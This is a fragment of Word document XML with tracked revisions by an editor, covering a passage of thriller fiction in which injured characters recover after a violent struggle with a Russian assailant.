            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>purple</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1371" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidR="0088666B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">mask of </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1372" w:author="TextVet" w:date="2016-03-18T15:07:00Z">
        <w:r w:rsidR="00C13C44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">purpling </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1373" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidR="0088666B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ash</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. H</w:t>
      </w:r>
      <w:del w:id="1374" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>e tried to say something, but h</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:ins w:id="1375" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>attempts at speech</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1376" w:author="TextVet" w:date="2016-03-18T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>voic</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1377" w:author="TextVet" w:date="2016-03-18T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">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xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1378" w:author="TextVet" w:date="2016-03-18T14:58:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>honked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1379" w:author="TextVet" w:date="2016-03-18T14:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>came out as a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1380" w:author="TextVet" w:date="2016-03-18T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E67EBB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">wet </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>guttural</w:t>
      </w:r>
      <w:ins w:id="1381" w:author="TextVet" w:date="2016-03-18T14:59:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1382" w:author="TextVet" w:date="2016-03-18T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> honk</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1383" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">, </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1384" w:author="TextVet" w:date="2016-03-18T14:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>barely discernible as human</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1385" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1386" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">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387" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1388" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is struggl</w:t>
      </w:r>
      <w:ins w:id="1389" w:author="TextVet" w:date="2016-03-18T15:02:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>es</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1390" w:author="TextVet" w:date="2016-03-18T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1391" w:author="TextVet" w:date="2016-03-18T15:02:00Z">
        <w:r w:rsidR="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">weakening </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1392" w:author="TextVet" w:date="2016-03-18T15:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>degenerated</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1393" w:author="TextVet" w:date="2016-03-18T15:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0056696A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to aimless twitches. After making a </w:t>
      </w:r>
      <w:ins w:id="1394" w:author="TextVet" w:date="2016-03-18T15:04:00Z">
        <w:r w:rsidR="00D95E38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">vomit-welcoming </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">series of </w:t>
      </w:r>
      <w:del w:id="1395" w:author="TextVet" w:date="2016-03-18T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D95E38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">disgusting </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gurgl</w:t>
      </w:r>
      <w:del w:id="1396" w:author="TextVet" w:date="2016-03-18T15:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D95E38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing nois</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es, he st</w:t>
      </w:r>
      <w:ins w:id="1397" w:author="TextVet" w:date="2016-03-18T15:05:00Z">
        <w:r w:rsidR="00D95E38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>illed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1398" w:author="TextVet" w:date="2016-03-18T15:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D95E38">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>opped moving</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“Mike…”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looked up vaguely at Danny, his nose crushed, his hair caked with gypsum powder, his beard moist with blood. He </w:t>
      </w:r>
      <w:ins w:id="1399" w:author="TextVet" w:date="2016-03-18T15:09:00Z">
        <w:r w:rsidR="000351D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>staggered up from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1400" w:author="TextVet" w:date="2016-03-18T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000351D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>lifted himself off</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1401" w:author="TextVet" w:date="2016-03-18T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009578DF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the Russian </w:t>
      </w:r>
      <w:del w:id="1402" w:author="TextVet" w:date="2016-03-18T15:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000351D8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>slowly and awkwardly</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1403" w:author="TextVet" w:date="2016-03-18T15:09:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000351D8">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and stood there, dazed, his imploded nose bleeding.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Then he took a few stumbling steps toward the wall, leaned against it, and vomited.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cellphone squawked from his pocket, “Are you guys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“Mike’s hurt,” Danny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are you,” said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“Nah, I’m fine,” said Danny. “Just winded.”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“You’ve lost a lot of blood,”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raised a perplexed eyebrow.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turned </w:t>
      </w:r>
      <w:del w:id="1404" w:author="TextVet" w:date="2016-03-18T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A1C53">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aro</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1405" w:author="TextVet" w:date="2016-03-18T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A1C53">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">und </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">to show him her cardigan. The parts </w:t>
      </w:r>
      <w:del w:id="1406" w:author="TextVet" w:date="2016-03-18T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00346253">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">of it </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">that had been in contact with the back of his left shoulder were soaked </w:t>
      </w:r>
      <w:ins w:id="1407" w:author="TextVet" w:date="2016-03-18T15:10:00Z">
        <w:r w:rsidR="00C5044D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>crimson</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1408" w:author="TextVet" w:date="2016-03-18T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C5044D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in blood</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. His blood.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“What the fuck?” He put down his machine, </w:t>
      </w:r>
      <w:ins w:id="1409" w:author="TextVet" w:date="2016-03-18T15:12:00Z">
        <w:r w:rsidR="00E015B3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>removed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1410" w:author="TextVet" w:date="2016-03-18T15:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E015B3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>took off</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his lab coat, and s</w:t>
      </w:r>
      <w:ins w:id="1411" w:author="TextVet" w:date="2016-03-18T15:11:00Z">
        <w:r w:rsidR="00316B6C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>crutinized</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1412" w:author="TextVet" w:date="2016-03-18T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00316B6C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>tared at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:del w:id="1413" w:author="TextVet" w:date="2016-03-18T15:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00316B6C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">red </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>stain.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high-pitched wheez</w:t>
      </w:r>
      <w:ins w:id="1414" w:author="TextVet" w:date="2016-03-18T15:12:00Z">
        <w:r w:rsidR="008A3408">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1415" w:author="TextVet" w:date="2016-03-18T15:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A3408">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing sound</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> emerged from the floor near them. The Russian stirred, the veins in his neck bulging.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w:t>
      </w:r>
      <w:ins w:id="1416" w:author="TextVet" w:date="2016-03-18T15:13:00Z">
        <w:r w:rsidR="00322FA5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>darted</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1417" w:author="TextVet" w:date="2016-03-18T15:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00322FA5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>quickly left Danny’s side and ran</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> towards the Russian. He was beginning to turn and lift his head, his still-unconscious body driven by reflexes to restore the </w:t>
      </w:r>
      <w:ins w:id="1418" w:author="TextVet" w:date="2016-03-18T15:14:00Z">
        <w:r w:rsidR="00E563F7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">air </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>flow</w:t>
      </w:r>
      <w:del w:id="1419" w:author="TextVet" w:date="2016-03-18T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E563F7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of air</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darted a hand into his pocket and grabbed his revolver.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said, “Get his phone.”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 With a few quick pats, she felt the rectangular bulge. She grabbed it and sprung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headed straight for Mike. He </w:t>
      </w:r>
      <w:del w:id="1420" w:author="TextVet" w:date="2016-03-18T15:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00895B7B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
